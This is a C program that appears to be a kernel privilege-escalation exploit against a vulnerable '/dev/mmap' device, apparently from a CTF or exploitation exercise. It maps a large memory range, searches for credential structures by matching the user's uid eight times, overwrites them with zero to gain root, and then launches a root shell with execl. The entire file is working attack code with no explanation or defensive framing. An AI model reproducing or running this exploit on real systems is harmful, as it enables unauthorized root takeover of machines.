
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

int main(void)
{
	unsigned int *addr;
	unsigned long size;
	int count = 0;
	int credNum = 0;
	int uid;
	unsigned mmapStart = 0x57575000;

	uid = getuid();
	printf("[+] uid: %d\n", uid);
	int fd = open("/dev/mmap", O_RDWR);
	if (fd < 0)
	{
		printf("[-] open failed.\n");
		return -1;
	}
	size = 0xf00000000;
	addr = (unsigned int *)mmap((void*)mmapStart, size,
		PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (addr == MAP_FAILED) {
		perror("failed to mmap:");
		close(fd);
		return -1;
	}
	printf("[+]mmap ok addr: %lx\n", addr);
	while (((unsigned long)addr) < (mmapStart + size))
{
	count = 0;
	if (
	addr[count++] == uid &&
	addr[count++] == uid &&
	addr[count++] == uid &&
	addr[count++] == uid &&
	addr[count++] == uid &&
	addr[count++] == uid &&
	addr[count++] == uid &&
	addr[count++] == uid
	) {
		credNum ++;
		printf("[+]found ptr:%p ,crednum:%d\n", addr, credNum);
		count = 0;
		addr[count++] = 0;
		addr[count++] = 0;
		addr[count++] = 0;
		addr[count++] = 0;
		addr[count++] = 0;
		addr[count++] = 0;
		addr[count++] = 0;
		addr[count++] = 0;
		if (getuid() == 0) {
			printf("[+] root successed.\n");
			execl("/bin/sh", "-", (char *)NULL);
			printf("Execl Failed.\n");
			break;
		}
		else {
			count = 0;
			addr[count++] = uid;
			addr[count++] = uid;
			addr[count++] = uid;
			addr[count++] = uid;
			addr[count++] = uid;
			addr[count++] = uid;
			addr[count++] = uid;
			addr[count++] = uid;
		}
	  }
		addr ++;
	}
	close(fd);
	return 0;
}

